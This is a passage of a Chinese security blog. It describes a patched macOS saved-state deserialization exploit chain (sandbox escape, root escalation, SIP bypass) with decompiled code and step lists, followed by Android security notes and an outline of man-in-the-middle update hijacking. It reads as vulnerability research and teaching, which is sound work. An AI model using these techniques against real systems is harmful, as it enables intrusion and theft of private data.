<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">id</span> obj = [decoder decodeObjectForKey:<span class="string">@&quot;myKey&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (![obj isKindOfClass:[MyClass <span class="keyword">class</span>]]) &#123; <span class="comment">/* ...fail... */</span> &#125;</span><br></pre></td></tr></table></figure>

<p>安全的：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">id</span> obj = [decoder decodeObjectOfClass:[MyClass <span class="keyword">class</span>] forKey:<span class="string">@&quot;myKey&quot;</span>];</span><br></pre></td></tr></table></figure>

<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>在保存状态的data.data文件中，对象是使用NSKeyedArchiver储存的，没有启用安全编码。这意味着我们可以包括任何实现NSCoding协议的类的对象。可能的原因是，应用程序可以用他们自己的对象来扩展保存的状态，由于保存的状态功能比NSSecureCoding要老，苹果不能直接将其升级为安全编码，因为这可能会影响第三方应用程序运行。</p>
<p>有两个对象相结合可以实现漏洞利用。</p>
<h3 id="NSRuleEditor"><a href="#NSRuleEditor" class="headerlink" title="NSRuleEditor"></a>NSRuleEditor</h3><p>这个类的 <code>-initWithCoder:</code>方法创建了一个同一存档中的对象的绑定，其key路径也是从存档中获得的。<a target="_blank" rel="noopener" href="https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/CocoaBindings/CocoaBindings.html">Bindings</a>是Cocoa中的反应式编程技术。创建绑定：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)bind:(<span class="built_in">NSBindingName</span>)binding </span><br><span class="line">    toObject:(<span class="type">id</span>)observable </span><br><span class="line"> withKeyPath:(<span class="built_in">NSString</span> *)keyPath </span><br><span class="line">     options:(<span class="built_in">NSDictionary</span>&lt;<span class="built_in">NSBindingOption</span>, <span class="type">id</span>&gt; *)options;</span><br></pre></td></tr></table></figure>

<p>这将把observable的keyPath和接收者的属性binding进行绑定。例如，又一个Person类，其有一个属性 <code>@property (readwrite, copy) NSString *name;</code>，然后可以把界面text的值和Person的name（keyPath）绑定起来。</p>
<p>不同的keypath的options含义选实际上是非常复杂的。例如，当用 “foo “这个关键路径进行绑定时，它首先会检查getFoo、foo、isFoo和_foo这些方法是否存在。这通常会被用来访问对象的一个属性，但这不是必须的。当一个绑定被创建时，该方法将在创建绑定时被立即调用，以提供一个初始值。这意味着，通过在反序列化过程中创建一个绑定，我们可以用它来调用其他反序列化对象上的零参数方法。</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ID <span class="built_in">NSRuleEditor</span>::initWithCoder:(ID param_1,SEL param_2,ID unarchiver)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="type">id</span> arrayOwner = [unarchiver decodeObjectForKey:<span class="string">@&quot;NSRuleEditorBoundArrayOwner&quot;</span>];</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (arrayOwner) &#123;</span><br><span class="line">	  keyPath = [unarchiver decodeObjectForKey:<span class="string">@&quot;NSRuleEditorBoundArrayKeyPath&quot;</span>];</span><br><span class="line">	  [<span class="keyword">self</span> bind:<span class="string">@&quot;rows&quot;</span> toObject:arrayOwner withKeyPath:keyPath options:<span class="literal">nil</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是利用它调用下一个对象的 <code>-draw</code>方法。</p>
<h3 id="NSCustomImageRep"><a href="#NSCustomImageRep" class="headerlink" title="NSCustomImageRep"></a>NSCustomImageRep</h3><p>这个对象从存档中获取一个对象和一个selector (a method name)。当调用 <code>-draw</code>方法时，它触发对象的selector方法，并将自己作为第一个参数传递进去：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ID <span class="built_in">NSCustomImageRep</span>::initWithCoder:(ID param_1,SEL param_2,ID unarchiver)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="type">id</span> drawObject = [unarchiver decodeObjectForKey:<span class="string">@&quot;NSDrawObject&quot;</span>];</span><br><span class="line">	<span class="keyword">self</span>.drawObject = drawObject;</span><br><span class="line">	<span class="type">id</span> drawMethod = [unarchiver decodeObjectForKey:<span class="string">@&quot;NSDrawMethod&quot;</span>];</span><br><span class="line">	SEL selector = <span class="built_in">NSSelectorFromString</span>(drawMethod);</span><br><span class="line">	<span class="keyword">self</span>.drawMethod = selector;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> ___24-[<span class="built_in">NSCustomImageRep_draw</span>]_block_invoke(<span class="type">long</span> param_1)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  [<span class="keyword">self</span>.drawObject performSelector:<span class="keyword">self</span>.drawMethod withObject:<span class="keyword">self</span>];</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过反序列化这两个类，我们现在可以调用零参数方法和多参数方法，尽管第一个参数将是一个NSCustomImageRep对象，其余的参数将是寄存器中的值。</p>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h3><p>原本状态保存的路径为：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/Library/Saved Application State/&lt;Bundle ID&gt;.savedState/</span><br></pre></td></tr></table></figure>

<p>如果应用程序在用户关闭计算机时打开过，那么这将是一个指向容器路径的符号链接。</p>
<p>沙箱的存储路径：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/Library/Containers/&lt;Bundle ID&gt;/Data/Library/Saved Application State/&lt;Bundle ID&gt;.savedState/</span><br></pre></td></tr></table></figure>

<p>大多数应用程序不能访问所有文件。沙盒应用程序当然是非常受限制的，但随着TCC的加入，即使是访问下载、文档等文件夹也需要用户批准。如果应用程序想要保存或打开一个文件，但只能看到该应用程序可以访问的文件，那就相当不方便了。为了解决这个问题，在打开这样一个面板时，系统会启动一个进程：com.apple.appkit.xpc.openAndSavePanelService。尽管窗口本身是应用程序的一部分，但其内容是由openAndSavePanelService绘制的。这是一个XPC服务，可以完全访问所有文件。当用户在面板中选择一个文件时，应用程序获得对该文件的临时访问权。这样一来，即使在没有权限列出这些文件的应用程序中，用户仍然可以浏览他们的整个磁盘。</p>
<p>我们注意到的是，这个XPC服务读取了它的保存状态，<strong>但使用的是启动它的应用程序的bundle ID</strong>，由于这个面板可能是多个应用程序的保存状态的一部分，它需要为每个应用程序分离其状态，这确实有些道理。</p>
<p>结果是，它从容器外的位置读取其保存的状态，但使用应用程序的bundle ID：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/Library/Saved Application State/&lt;Bundle ID&gt;.savedState/</span><br></pre></td></tr></table></figure>

<p>沙箱逃逸步骤：</p>
<ol>
<li>如果符号链接尚不存在，则等待用户在应用程序打开时关机。</li>
<li>在应用程序自己的容器内写入恶意的data.data和windows.plist文件。</li>
<li>打开一个NSOpenPanel或NSSavePanel。</li>
</ol>
<p>com.apple.appkit.xpc.openAndSavePanelService进程会反序列化恶意对象，让我们在一个非沙盒进程中执行代码。</p>
<p>这比其他问题更早被修复，在macOS 11.3中被列为CVE-2021-30659。苹果通过不再从com.apple.appkit.xpc.openAndSavePanelService中的相同位置加载状态来解决这个问题。</p>
<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>通过将我们的代码注入一个具有特定权限的应用程序，我们可以将我们的权限提升到root。为此，我们可以应用A2nkF在<a target="_blank" rel="noopener" href="https://a2nkf.github.io/unauthd_Logic_bugs_FTW/">Unauthd - Logic bugs FTW</a>中介绍的技术。</p>
<p>一些应用程序有一个com.apple.private.AuthorizationServices的权限，其中包含system.install.apple-software的值。这意味着这个应用程序被允许安装有苹果签名的软件包，而无需用户授权。例如，”Install Command Line Developer Tools.app “和 “Bootcamp Assistant.app “有这个权利。A2nkF还发现了一个由苹果签名的软件包，其中包含一个漏洞：macOSPublicBetaAccessUtility.pkg。当这个软件包被安装到一个特定的磁盘时，它将从该磁盘运行（以root身份）一个安装后脚本。该脚本假定它被安装到含有macOS的磁盘上，但这并没有被检查。因此，通过在同一位置创建一个恶意脚本，就有可能通过安装这个软件包以root身份执行代码。</p>
<p>漏洞利用步骤：</p>
<ol>
<li>创建一个RAM磁盘，并复制一个恶意脚本到将由macOSPublicBetaAccessUtility.pkg执行的路径。</li>
<li>通过为该应用程序创建windows.plist和data.data文件，将我们的代码注入含有system.install.apple-software权利的应用程序中，然后启动它。</li>
<li>使用注入的代码将macOSPublicBetaAccessUtility.pkg包安装到RAM磁盘。</li>
<li>等待安装后脚本的运行。</li>
</ol>
<p>在A2nkF的文章中，安装后脚本的运行没有SIP的文件系统限制。它从安装过程中继承了这一点，因为软件包的安装可能需要写到SIP保护的位置。这一点已被苹果公司修复：安装后和安装前的脚本不再有SIP豁免。然而，该软件包及其特权升级仍然可以使用，因为苹果仍然使用相同的脆弱的安装包。</p>
<h3 id="SIP绕过"><a href="#SIP绕过" class="headerlink" title="SIP绕过"></a>SIP绕过</h3><p>现在我们已经逃离了沙盒，并将我们的权限提升到了root。我们在macOS Big Sur Beta安装盘镜像上找到了一些东西。”macOS Update Assistant.app “有com.apple.rootless.install.heritable的权利。这意味着这个进程可以写到所有受SIP保护的位置（而且它是可继承的，这很方便，因为我们可以直接生成一个shell）。虽然它应该只在测试版安装时使用，但我们可以把它复制到正常的macOS环境中，并在那里运行它。</p>
<p>漏洞利用步骤：</p>
<ol>
<li>为 “macOS Update Assistant.app “创建恶意的windows.plist和data.data文件。</li>
<li>启动 “macOS Update Assistant.app”。</li>
</ol>
<p>当免于SIP的文件系统限制时，我们可以从受保护的位置读取所有文件，如用户的Mail.app邮箱。我们还可以修改TCC数据库，这意味着我们可以授予自己访问网络摄像头、麦克风等的权限。我们还可以将我们的恶意软件持续存在于受SIP保护的位置，使苹果以外的人很难删除它。最后，我们可以改变批准的内核扩展数据库。这意味着，我们可以默默地加载一个新的内核扩展，而不需要用户批准。当与一个易受攻击的内核扩展（或一个允许签署内核扩展的编码证书）相结合时，我们将能够获得内核代码执行，这也将允许禁用所有其他限制。</p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>苹果在11.3中首先修复了沙盒逃逸，不再读取com.apple.appkit.xpc.openAndSavePanelService中应用程序的保存状态（CVE-2021-30659）。</p>
<p>修复该漏洞的其余部分则更为复杂。第三方应用程序可能会在保存状态中存储自己的对象，这些对象可能不支持安全编码。方法：-applicationSupportsSecureRestorableState:。应用程序现在可以通过从该方法返回TRUE来选择是否需要对其保存状态进行安全编码。除非应用程序选择加入，否则它将继续允许非安全编码，这意味着进程注入可能仍然存在。</p>
<p>这确实突出了这些安全措施的当前设计的一个问题：降级攻击。一个应用程序的代码签名（以及由此产生的权利）将在很长一段时间内保持有效，如果应用程序被降级，应用程序的TCC权限仍将有效。一个没有沙盒的应用程序可以默默地下载一个旧的、有漏洞的应用程序版本，并利用它。对于SIP绕过来说，这将不起作用，因为 “macOS Update Assistant.app “不能在macOS Monterey上运行，因为某些私有框架不再包含必要的符号。但这是一个巧合的修复，在许多其他情况下，旧的应用程序可能仍然运行良好。因此，只要对旧的macOS应用程序有向后的兼容性，这个漏洞就会一直存在。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/07/30/Android%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/07/30/Android%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">Android安全笔记</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-07-30 15:29:09" itemprop="dateCreated datePublished" datetime="2022-07-30T15:29:09+08:00">2022-07-30</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-11-30 15:39:15" itemprop="dateModified" datetime="2022-11-30T15:39:15+08:00">2022-11-30</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>整理一下 Android APP安全相关的笔记，有些是已经知道了的，但是没有去系统的记录梳理。</p>
<h1 id="安全问题分类"><a href="#安全问题分类" class="headerlink" title="安全问题分类"></a>安全问题分类</h1><h2 id="四大组件"><a href="#四大组件" class="headerlink" title="四大组件"></a>四大组件</h2><p>Android的四大组件有两种对外开放的方式：</p>
<ul>
<li><ol>
<li>通过在<code>manifest</code>文件中声明<code>exported=true</code>；</li>
</ol>
</li>
<li><ol start="2">
<li>如果没有1中的声明，可以通过隐式的Intent进行访问。<br>影响：其他程序可以进行劫持，如果对传入的Intent数据处理不够，有可能导致Dos攻击。<br>解决方案：显示声明<code>exported=false</code>，或者指定Intent的类，或者对权限进行限制。</li>
</ol>
</li>
</ul>
<h2 id="Webview"><a href="#Webview" class="headerlink" title="Webview"></a>Webview</h2><p>Android4.4之前，可以通过js注入获取客户端信息，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsToJava</span>(), <span class="string">&quot;myjsfunction&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>4.4之后需要加入@JavascriptInterface注解。</p>
<h2 id="APP流量请求问题"><a href="#APP流量请求问题" class="headerlink" title="APP流量请求问题"></a>APP流量请求问题</h2><p>主要是指APP使用了HTTP，或者是HTTPS的证书校验不够，导致可以进行中间人攻击，其实就是去实现Android的抓包分析，具体可以看《Android中间人攻击方法整理》这篇笔记。</p>
<h1 id="Android系统安全知识"><a href="#Android系统安全知识" class="headerlink" title="Android系统安全知识"></a>Android系统安全知识</h1><p>Android安全主要由系统框架实现、开发者构建设计和用户授权三个部分。<br>Android安全设计理念：应用程序不应该损害操作系统资源、用户和其他应用程序。因此Android实现了两个层次的安全机制：</p>
<ul>
<li><ol>
<li>Linux层：为每个应用程序分配单独的 Unix 用户（UID）和组（GID）标识符。强制在单独的 Linux 进程中运行每个应用程序。</li>
</ol>
<ul>
<li>1.1 Android 中有一些地方可以用于设置文件、驱动和 Unix 套接字的文件系统权限：init程序、init.rc配置文件、ueventd.rc配置文件和系统 ROM 文件系统配置文件。</li>
</ul>
</li>
<li><ol start="2">
<li>框架层：init进程，位于 Android 文件系统的根目录中，负责创建文件系统基本条目，程序解析<code>init.rc</code>配置文件并执行其中的命令。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">( <span class="type">int</span> argc, <span class="type">char</span> **argv )</span> </span><br><span class="line"> 2 &#123; </span><br><span class="line"> <span class="number">3</span>   ... </span><br><span class="line"> <span class="number">4</span>   <span class="keyword">if</span> (!<span class="built_in">strcmp</span> (basename( argv[<span class="number">0</span>] ), <span class="string">&quot;ueventd&quot;</span>) ) </span><br><span class="line"> <span class="number">5</span>     <span class="keyword">return</span> ueventd_main ( argc, argv ) ; </span><br><span class="line"> <span class="number">6</span>   ... </span><br><span class="line"> <span class="number">7</span>   mkdir(<span class="string">&quot;/dev&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"> <span class="number">8</span>   mkdir(<span class="string">&quot;/proc&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"> <span class="number">9</span>   mkdir(<span class="string">&quot;/sys&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"><span class="number">10</span> </span><br><span class="line"><span class="number">11</span>   mount(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/dev&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, MS_NOSUID, <span class="string">&quot;mode=0755&quot;</span>) ; </span><br><span class="line"><span class="number">12</span>   mkdir(<span class="string">&quot;/dev/pts&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"><span class="number">13</span>   mkdir(<span class="string">&quot;/dev/socket&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"><span class="number">14</span>   mount(<span class="string">&quot;devpts&quot;</span>, <span class="string">&quot;/dev/pts&quot;</span>, <span class="string">&quot;devpts&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>) ; </span><br><span class="line"><span class="number">15</span>   mount(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>) ; </span><br><span class="line"><span class="number">16</span>   mount(<span class="string">&quot;sysfs&quot;</span>, <span class="string">&quot;/sys&quot;</span>, <span class="string">&quot;sysfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>) ; </span><br><span class="line"><span class="number">17</span>   ... </span><br><span class="line"><span class="number">18</span>   init_parseconfig_file(<span class="string">&quot;/init.rc&quot;</span>) ; </span><br><span class="line"><span class="number">19</span>   ... </span><br><span class="line"><span class="number">20</span> &#125;</span><br></pre></td></tr></table></figure>
<code>init.rc</code>配置文件使用一种称为 Android Init Language 的语言编写，位于根目录下。在<code>init.rc</code>配置文件中编写的命令定义系统全局变量，为内存管理设置基本内核参数，配置文件系统，启动几个守护进程和进程（不会完全继承init的root权限），更重要的是负责基本文件系统结构的创建，并为创建的节点分配所有者和文件系统权限。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 on fs </span><br><span class="line">2   <span class="comment"># mount mtd partitions </span></span><br><span class="line">3   <span class="comment"># Mount /system rw first to give the filesystem a chance to save a checkpoint </span></span><br><span class="line">4   mount yaffs2 mtd@system /system </span><br><span class="line">5   mount yaffs2 mtd@system /system ro remount </span><br><span class="line">6   mount yaffs2 mtd@userdata /data nosuid nodev </span><br><span class="line">7   mount yaffs2 mtd@cache /cache nosuid nodev</span><br></pre></td></tr></table></figure>
第一个派生自init的守护进程是ueventd守护进程，通过读取<code>ueventd.rc</code>和<code>ueventd.[device name].rc</code>配置文件，重放指定的内核<code>uevent_hotplug</code>事件。 这些事件设置了不同设备的所有者和权限。之后，守护进程等待监听所有未来的热插拔事件。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 ...</span><br><span class="line">2 /dev/ashmem 0666 root root </span><br><span class="line">3 /dev/binder 0666 root root </span><br><span class="line">4 ...</span><br><span class="line">5 /dev/cam 0660 root camera </span><br><span class="line">6 ...</span><br></pre></td></tr></table></figure>
由init程序启动的核心服务之一是servicemanager。 此服务充当在 Android 中运行的所有服务的索引。<br>init进程启动的另一个核心进程是 Zygote。这个不用多说，需要注意的是，Zygote派生的新进程的内存具有“写时复制”（COW）保护，这意味着只有当后者尝试写入受保护的内存时，数据才会从 zygote 进程复制到新进程。<br>init还会启动其他的进程，不多说了。</li>
</ol>
</li>
<li><ol start="3">
<li>Android权限，如System权限等，然后又在此基础上，对权限的等级进行了划分，也就是normal、dangerous、signature和signatureOrSystem。系统权限的定义位于<code>frameworks/base/core/res</code>中。</li>
</ol>
</li>
</ul>
<h1 id="组件相关"><a href="#组件相关" class="headerlink" title="组件相关"></a>组件相关</h1><ol>
<li><p>Activity在Manifest中有一个配置叫做android:priority ，即优先级。这个配置在AOSP的系统应用中很常见，<strong>当Intent可以resolve到多个Activity时，如果其中存在高优先级的Activity则会被直接选择，并不会触发用户选择的流程</strong>。</p>
</li>
<li><p>Intent有个非常特殊的地方，<strong>即Component和Package是两个互不相关的变量</strong>，在resolve一个Intent时，Component的优先级是最高的，当它被设置时，mPackage会被直接忽略。</p>
</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/07/20/Android%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/07/20/Android%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" class="post-title-link" itemprop="url">Android中间人攻击方法整理</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-07-20 20:35:56" itemprop="dateCreated datePublished" datetime="2022-07-20T20:35:56+08:00">2022-07-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-07-29 22:27:24" itemprop="dateModified" datetime="2022-07-29T22:27:24+08:00">2022-07-29</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这里的目标是汇总一些，Android平台上的，基于中间人的，用于植入恶意代码的攻击方法的一个整理，也可以用于其他平台。</p>
<p>能够进行劫持，大部分都是因为使用了HTTP协议。利用的基本思路是：</p>
<ol>
<li>部署中间人设备；</li>
<li>监听网络流量；</li>
<li>当目标请求服务器时，劫持该请求，并响应恶意文件。</li>
</ol>
<p>具体可以参考这个<a target="_blank" rel="noopener" href="https://patentimages.storage.googleapis.com/67/cf/11/ee5bb9a604a455/CN106936849A.pdf">专利</a>。</p>
<h1 id="APP升级过程劫持"><a href="#APP升级过程劫持" class="headerlink" title="APP升级过程劫持"></a>APP升级过程劫持</h1><p>APP版本升级时一般是请求升级接口，如果有升级，服务端返回一个下载地址，下载好APK后，再点击安装。其中，这里有三个地方可以进行劫持，请求升级时、下载文件时和安装时。</p>
<h2 id="请求升级API"><a href="#请求升级API" class="headerlink" title="请求升级API"></a>请求升级API</h2><p>如果使用的是HTTP请求，可以进行劫持，返回一个恶意下载地址。</p>
<p>解决方案：建议使用HTTPS。</p>
<h2 id="下载API"><a href="#下载API" class="headerlink" title="下载API"></a>下载API</h2><p>还是HTTP请求。</p>
<p>解决方案：HTTPS，对服务端返回的文件进行hash校验，<em>还有服务端返回的key进行校验</em>。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在安装时，安装的文件路径被修改了，可能安装了其他奇怪的东西。</p>
<p>解决方案：对APK文件进行包名和签名验证。</p>
<h1 id="安全开发的例子🌰"><a href="#安全开发的例子🌰" class="headerlink" title="安全开发的例子🌰"></a>安全开发的例子🌰</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UpgradeModel</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line">    <span class="keyword">private</span> DataBean data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCode</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMsg</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMsg</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span 